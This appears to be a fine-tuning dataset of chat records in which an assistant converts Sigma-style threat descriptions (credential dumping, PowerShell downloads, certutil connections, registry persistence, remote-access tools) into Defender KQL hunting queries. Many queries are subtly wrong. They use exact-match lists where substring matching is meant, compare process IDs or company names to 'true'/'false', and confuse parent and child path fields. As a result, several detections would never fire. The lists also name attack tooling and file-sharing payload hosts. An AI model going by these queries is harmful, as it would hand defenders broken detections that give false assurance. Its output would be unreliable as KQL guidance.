{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access requests to files ending with either the \".hive\"/\".reg\" extension, usually associated with Windows Registry backups. Topic: file_access_win_susp_reg_and_hive"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName endswith \".hive\" or FileName endswith \".reg\") and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects dump of credentials in VeeamBackup dbo Topic: proc_creation_win_sqlcmd_veeam_dump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"SELECT\", \"TOP\", \"[VeeamBackup].[dbo].[Credentials]\")) and InitiatingProcessFolderPath =~ \"\\\\sqlcmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of files that look like exports of the local SAM (Security Account Manager) Topic: file_event_win_sam_dump"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FolderPath endswith \"\\\\Temp\\\\sam\" or FolderPath endswith \"\\\\sam.sav\" or FolderPath endswith \"\\\\Intel\\\\sam\" or FolderPath endswith \"\\\\sam.hive\" or FolderPath endswith \"\\\\Perflogs\\\\sam\" or FolderPath endswith \"\\\\ProgramData\\\\sam\" or FolderPath endswith \"\\\\Users\\\\Public\\\\sam\" or FolderPath endswith \"\\\\AppData\\\\Local\\\\sam\" or FolderPath endswith \"\\\\AppData\\\\Roaming\\\\sam\" or FolderPath endswith \"_ShadowSteal.zip\" or FolderPath endswith \"\\\\Documents\\\\SAM.export\" or FolderPath endswith \":\\\\sam\") or (FolderPath contains \"\\\\hive_sam_\" or FolderPath contains \"\\\\sam.save\" or FolderPath contains \"\\\\sam.export\" or FolderPath contains \"\\\\~reg_sam.save\" or FolderPath contains \"\\\\sam_backup\" or FolderPath contains \"\\\\sam.bck\" or FolderPath contains \"\\\\sam.backup\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects dropped files with double extensions, which is often used by malware as a method to abuse the fact that Windows hide default extensions by default. Topic: file_event_win_susp_double_extension"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".rar.exe\", \".zip.exe\")) or (FileName in~ (\".doc.\", \".docx.\", \".jpg.\", \".pdf.\", \".ppt.\", \".pptx.\", \".xls.\", \".xlsx.\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious script executions from temporary folder Topic: proc_creation_win_susp_script_exec_from_temp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"\\\\Windows\\\\Temp\", \"\\\\Temporary Internet\", \"\\\\AppData\\\\Local\\\\Temp\", \"\\\\AppData\\\\Roaming\\\\Temp\", \"%TEMP%\", \"%TMP%\", \"%LocalAppData%\\\\Temp\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\mshta.exe\", \"\\\\wscript.exe\", \"\\\\cscript.exe\"))) and (not((ProcessCommandLine in~ (\" >\", \"Out-File\", \"ConvertTo-Json\", \"-WindowStyle hidden -Verb runAs\", \"\\\\Windows\\\\system32\\\\config\\\\systemprofile\\\\AppData\\\\Local\\\\Temp\\\\Amazon\\\\EC2-Windows\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a office macro file from a a suspicious process Topic: file_event_win_office_macro_files_from_susp_process"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((InitiatingProcessFolderPath endswith \"\\\\cscript.exe\" or InitiatingProcessFolderPath endswith \"\\\\mshta.exe\" or InitiatingProcessFolderPath endswith \"\\\\regsvr32.exe\" or InitiatingProcessFolderPath endswith \"\\\\rundll32.exe\" or InitiatingProcessFolderPath endswith \"\\\\wscript.exe\") or (InitiatingProcessParentFileName in~ (\"cscript.exe\", \"mshta.exe\", \"regsvr32.exe\", \"rundll32.exe\", \"wscript.exe\"))) and (FileName in~ (\".docm\", \".dotm\", \".xlsm\", \".xltm\", \".potm\", \".pptm\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2021-26084 Topic: proc_creation_win_exploit_cve_2021_26084_atlassian_confluence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\Atlassian\\\\Confluence\\\\jre\\\\bin\\\\java.exe\" and (ProcessCommandLine in~ (\"certutil\", \"cmd /c\", \"cmd /k\", \"cscript\", \"curl\", \"ipconfig\", \"powershell\", \"pwsh\", \"regsvr32\", \"rundll32\", \"whoami\", \"wscript\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM. Topic: proc_creation_win_virtualbox_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"VBoxRT.dll,RTR3Init\", \"VBoxC.dll\", \"VBoxDrv.sys\")) or (ProcessCommandLine in~ (\"startvm\", \"controlvm\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.\nScript being executed gets created as a temp file in /tmp folder with a scx* prefix.\nThen it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.\nThe file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n Topic: proc_creation_lnx_omigod_scx_runasprovider_executescript"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/var/opt/microsoft/scx/tmp\" and InitiatingProcessSessionId == 0 and ProcessCommandLine =~ \"/etc/opt/microsoft/scx/conf/tmpdir/scx\" and AccountName =~ \"root\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection. Topic: proc_creation_win_mssql_veaam_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine =~ \"VEEAMSQL\" and InitiatingProcessFileName =~ \"\\\\sqlservr.exe\") and (((ProcessCommandLine in~ (\"-ex \", \"bypass\", \"cscript\", \"DownloadString\", \"http://\", \"https://\", \"mshta\", \"regsvr32\", \"rundll32\", \"wscript\", \"copy \")) and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wsl.exe\", \"\\\\wt.exe\"))) or (InitiatingProcessFolderPath in~ (\"\\\\net.exe\", \"\\\\net1.exe\", \"\\\\netstat.exe\", \"\\\\nltest.exe\", \"\\\\ping.exe\", \"\\\\tasklist.exe\", \"\\\\whoami.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enumeration of other remote systems. Topic: proc_creation_lnx_remote_system_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"-a\" and InitiatingProcessFolderPath =~ \"/arp\") or ((ProcessCommandLine in~ (\" 10.\", \" 192.168.\", \" 172.16.\", \" 172.17.\", \" 172.18.\", \" 172.19.\", \" 172.20.\", \" 172.21.\", \" 172.22.\", \" 172.23.\", \" 172.24.\", \" 172.25.\", \" 172.26.\", \" 172.27.\", \" 172.28.\", \" 172.29.\", \" 172.30.\", \" 172.31.\", \" 127.\", \" 169.254.\")) and InitiatingProcessFolderPath =~ \"/ping\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the load of dbghelp/dbgcore DLL (used to make memory dumps) by suspicious processes.\nTools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll.\nAs an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attackers machine.\n Topic: image_load_dll_dbghelp_dbgcore_unsigned_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\dbghelp.dll\" or FolderPath endswith \"\\\\dbgcore.dll\") and InitiatingProcessVersionInfoCompanyName =~ \"false\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by the Add-In deployment cache updating utility \"AddInutil.exe\".\nThis could indicate a potential command and control communication as this tool doesnt usually initiate network activity.\n Topic: net_connection_win_addinutil_initiated"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\addinutil.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the Netsh registry key to add a new DLL value that is located on a suspicious location. This change might be an indication of a potential persistence attempt by adding a malicious Netsh helper\n Topic: registry_set_netsh_help_dll_persistence_susp_location"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\NetSh\" and ((RegistryValueData contains \":\\\\Perflogs\\\\\" or RegistryValueData contains \":\\\\Users\\\\Public\\\\\" or RegistryValueData contains \":\\\\Windows\\\\Temp\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or RegistryValueData contains \"\\\\Temporary Internet\") or ((RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Favorites\\\\\") or (RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Favourites\\\\\") or (RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Contacts\\\\\") or (RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Pictures\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Kerberos DLL being loaded by an Office Product Topic: image_load_office_kerberos_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\kerberos.dll\" and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\mspub.exe\", \"\\\\onenote.exe\", \"\\\\onenoteim.exe\", \"\\\\outlook.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell) Topic: proc_creation_win_cmd_http_appdata"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"http\", \"://\", \"%AppData%\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"Default\" property for keys located in the \\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\ registry. Which might be used as a method of persistence\nThe entries found under App Paths are used primarily for the following purposes.\nFirst, to map an applications executable file name to that files fully qualified path.\nSecond, to prepend information to the PATH environment variable on a per-application, per-process basis.\n Topic: registry_set_persistence_app_paths"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\" and (RegistryKey endswith \"(Default)\" or RegistryKey endswith \"Path\") and (RegistryValueData contains \"\\\\Users\\\\Public\" or RegistryValueData contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or RegistryValueData contains \"\\\\Windows\\\\Temp\\\\\" or RegistryValueData contains \"\\\\Desktop\\\\\" or RegistryValueData contains \"\\\\Downloads\\\\\" or RegistryValueData contains \"%temp%\" or RegistryValueData contains \"%tmp%\" or RegistryValueData contains \"iex\" or RegistryValueData contains \"Invoke-\" or RegistryValueData contains \"rundll32\" or RegistryValueData contains \"regsvr32\" or RegistryValueData contains \"mshta\" or RegistryValueData contains \"cscript\" or RegistryValueData contains \"wscript\" or RegistryValueData contains \".bat\" or RegistryValueData contains \".hta\" or RegistryValueData contains \".dll\" or RegistryValueData contains \".ps1\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects external IP address lookups by non-browser processes via services such as \"api.ipify.org\". This could be indicative of potential post compromise internet test activity. Topic: net_connection_win_domain_external_ip_lookup"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where ((RemoteUrl in~ (\"www.ip.cn\", \"l2.io\")) or (RemoteUrl contains \"api.2ip.ua\" or RemoteUrl contains \"api.bigdatacloud.net\" or RemoteUrl contains \"api.ipify.org\" or RemoteUrl contains \"bot.whatismyipaddress.com\" or RemoteUrl contains \"canireachthe.net\" or RemoteUrl contains \"checkip.amazonaws.com\" or RemoteUrl contains \"checkip.dyndns.org\" or RemoteUrl contains \"curlmyip.com\" or RemoteUrl contains \"db-ip.com\" or RemoteUrl contains \"edns.ip-api.com\" or RemoteUrl contains \"eth0.me\" or RemoteUrl contains \"freegeoip.app\" or RemoteUrl contains \"geoipy.com\" or RemoteUrl contains \"getip.pro\" or RemoteUrl contains \"icanhazip.com\" or RemoteUrl contains \"ident.me\" or RemoteUrl contains \"ifconfig.io\" or RemoteUrl contains \"ifconfig.me\" or RemoteUrl contains \"ip-api.com\" or RemoteUrl contains \"ip.360.cn\" or RemoteUrl contains \"ip.anysrc.net\" or RemoteUrl contains \"ip.taobao.com\" or RemoteUrl contains \"ip.tyk.nu\" or RemoteUrl contains \"ipaddressworld.com\" or RemoteUrl contains \"ipapi.co\" or RemoteUrl contains \"ipconfig.io\" or RemoteUrl contains \"ipecho.net\" or RemoteUrl contains \"ipinfo.io\" or RemoteUrl contains \"ipip.net\" or RemoteUrl contains \"ipof.in\" or RemoteUrl contains \"ipv4.icanhazip.com\" or RemoteUrl contains \"ipv4bot.whatismyipaddress.com\" or RemoteUrl contains \"ipv6-test.com\" or RemoteUrl contains \"ipwho.is\" or RemoteUrl contains \"jsonip.com\" or RemoteUrl contains \"myexternalip.com\" or RemoteUrl contains \"seeip.org\" or RemoteUrl contains \"wgetip.com\" or RemoteUrl contains \"whatismyip.akamai.com\" or RemoteUrl contains \"whois.pconline.com.cn\" or RemoteUrl contains \"wtfismyip.com\")) and (not((InitiatingProcessFolderPath =~ \"\\\\brave.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\")) or (InitiatingProcessFolderPath startswith \"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeWebView\\\\Application\\\\\" or InitiatingProcessFolderPath endswith \"\\\\WindowsApps\\\\MicrosoftEdge.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\", \"C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\"))) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeCore\\\\\", \"C:\\\\Program Files\\\\Microsoft\\\\EdgeCore\\\\\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\", \"C:\\\\Program Files (x86)\\\\Mozilla Firefox\\\\firefox.exe\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\", \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\")) or InitiatingProcessFolderPath =~ \"\\\\maxthon.exe\" or InitiatingProcessFolderPath =~ \"\\\\opera.exe\" or InitiatingProcessFolderPath =~ \"\\\\safari.exe\" or InitiatingProcessFolderPath =~ \"\\\\seamonkey.exe\" or InitiatingProcessFolderPath =~ \"\\\\vivaldi.exe\" or InitiatingProcessFolderPath =~ \"\\\\whale.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a JAVA process running with remote debugging allowing more than just localhost to connect Topic: proc_creation_win_java_remote_debugging"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"transport=dt_socket,address=\" and (ProcessCommandLine in~ (\"jre1.\", \"jdk1.\"))) and (not((ProcessCommandLine in~ (\"address=127.0.0.1\", \"address=localhost\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Microsoft Excel loading an Add-In (.xll) file from an uncommon location Topic: image_load_office_excel_xll_susp_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath contains \"\\\\Desktop\\\\\" or FolderPath contains \"\\\\Downloads\\\\\" or FolderPath contains \"\\\\Perflogs\\\\\" or FolderPath contains \"\\\\Temp\\\\\" or FolderPath contains \"\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\Windows\\\\Tasks\\\\\") and FolderPath endswith \".xll\" and InitiatingProcessFolderPath =~ \"\\\\excel.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Download or Copy file with Extrac32 Topic: proc_creation_win_lolbin_extrac32"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \".cab\" and (ProcessCommandLine contains \"extrac32.exe\" or FolderPath endswith \"\\\\extrac32.exe\" or ProcessVersionInfoOriginalFileName =~ \"extrac32.exe\") and (ProcessCommandLine in~ (\"/C\", \"/Y\", \" \\\\\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific command used by the Conti ransomware group Topic: proc_creation_win_malware_conti_ransomware_commands"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"-m \", \"-net \", \"-size \", \"-nomutex \", \"-p \\\\\\\\\", \"$\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious file downloads from file sharing domains using PowerShell.exe Topic: proc_creation_win_powershell_download_susp_file_sharing_domains"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".DownloadString(\", \".DownloadFile(\", \"Invoke-WebRequest \", \"iwr \", \"wget \")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and (ProcessCommandLine in~ (\"anonfiles.com\", \"cdn.discordapp.com\", \"ddns.net\", \"dl.dropboxusercontent.com\", \"ghostbin.co\", \"glitch.me\", \"gofile.io\", \"hastebin.com\", \"mediafire.com\", \"mega.nz\", \"onrender.com\", \"pages.dev\", \"paste.ee\", \"pastebin.com\", \"pastebin.pl\", \"pastetext.net\", \"pixeldrain.com\", \"privatlab.com\", \"privatlab.net\", \"send.exploit.in\", \"sendspace.com\", \"storage.googleapis.com\", \"storjshare.io\", \"supabase.co\", \"temp.sh\", \"transfer.sh\", \"trycloudflare.com\", \"ufile.io\", \"w3spaces.com\", \"workers.dev\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a when net.exe is called with a password in the command line Topic: proc_creation_win_net_use_password_plaintext"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" use \") or (ProcessCommandLine contains \":\" and ProcessCommandLine contains \"\\\\\") or (ProcessCommandLine contains \"/USER:\" and ProcessCommandLine contains \" \")) and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))) and (not(ProcessCommandLine endswith \" \"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential abuse of the provisioning registry key for indirect command execution through \"Provlaunch.exe\". Topic: registry_set_provisioning_command_abuse"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Provisioning\\\\Commands*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon child processes spawning from \"sigverif.exe\", which could indicate potential abuse of the latter as a living of the land binary in order to proxy execution.\n Topic: proc_creation_win_sigverif_uncommon_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\sigverif.exe\" and (not((FolderPath in~ (\"C:\\\\Windows\\\\System32\\\\WerFault.exe\", \"C:\\\\Windows\\\\SysWOW64\\\\WerFault.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Use of hostname to get information Topic: proc_creation_win_hostname_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\HOSTNAME.EXE\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: proc_creation_win_remote_access_tools_anydesk_susp_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\AnyDesk.exe\" or ProcessVersionInfoFileDescription =~ \"AnyDesk\" or ProcessVersionInfoProductName =~ \"AnyDesk\" or ProcessVersionInfoCompanyName =~ \"AnyDesk Software GmbH\") and (not((FolderPath contains \"\\\\AppData\\\\\" or FolderPath contains \"Program Files (x86)\\\\AnyDesk\" or FolderPath contains \"Program Files\\\\AnyDesk\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: proc_creation_win_remote_access_tools_simple_help"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"\\\\JWrapper-Remote Access\\\\\" or FolderPath contains \"\\\\JWrapper-Remote Support\\\\\") and InitiatingProcessFolderPath =~ \"\\\\SimpleService.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"dbghelp.dll\" Topic: image_load_side_load_dbghelp"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\dbghelp.dll\" and (not((FolderPath startswith \"C:\\\\Program Files (x86)\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SoftwareDistribution\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\System32\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SystemTemp\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SysWOW64\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\"))) and (not(((FolderPath endswith \"\\\\Anaconda3\\\\Lib\\\\site-packages\\\\vtrace\\\\platforms\\\\windll\\\\amd64\\\\dbghelp.dll\" or FolderPath endswith \"\\\\Anaconda3\\\\Lib\\\\site-packages\\\\vtrace\\\\platforms\\\\windll\\\\i386\\\\dbghelp.dll\") or (FolderPath endswith \"\\\\Epic Games\\\\Launcher\\\\Engine\\\\Binaries\\\\ThirdParty\\\\DbgHelp\\\\dbghelp.dll\" or FolderPath endswith \"\\\\Epic Games\\\\MagicLegends\\\\x86\\\\dbghelp.dll\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of \"UserInitMprLogonScript\" registry value which can be used as a persistence method by malicious actors Topic: registry_add_persistence_logon_scripts_userinitmprlogonscript"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"RegistryKeyCreated\" and RegistryKey contains \"UserInitMprLogonScript\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the import of .reg files from suspicious paths using the reg.exe utility Topic: proc_creation_win_reg_import_from_suspicious_paths"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" import \" and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\") and (ProcessCommandLine in~ (\"C:\\\\Users\\\\\", \"%temp%\", \"%tmp%\", \"%appdata%\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"C:\\\\Windows\\\\Temp\\\\\", \"C:\\\\ProgramData\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by the certutil.exe utility.\nAttackers can abuse the utility in order to download malware or additional payloads.\n Topic: net_connection_win_certutil_initiated_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\certutil.exe\" and (RemotePort in~ (\"80\", \"135\", \"443\", \"445\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Obfuscated use of Clip.exe to execute PowerShell Topic: proc_creation_win_hktl_invoke_obfuscation_clip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"/c\", \"/r\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed version of the Plink binary Topic: proc_creation_win_renamed_plink"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoOriginalFileName =~ \"Plink\" or (ProcessCommandLine contains \" -l forward\" and ProcessCommandLine contains \" -P \" and ProcessCommandLine contains \" -R \")) and (not(InitiatingProcessFolderPath =~ \"\\\\plink.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious files created via the OneNote application. This could indicate a potential malicious \".one\"/\".onepkg\" file was executed as seen being used in malware activity in the wild Topic: file_event_win_office_onenote_susp_dropped_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".bat\", \".chm\", \".cmd\", \".dll\", \".exe\", \".hta\", \".htm\", \".html\", \".js\", \".lnk\", \".ps1\", \".vbe\", \".vbs\", \".wsf\")) and (InitiatingProcessFolderPath in~ (\"\\\\onenote.exe\", \"\\\\onenotem.exe\", \"\\\\onenoteim.exe\"))"}]}
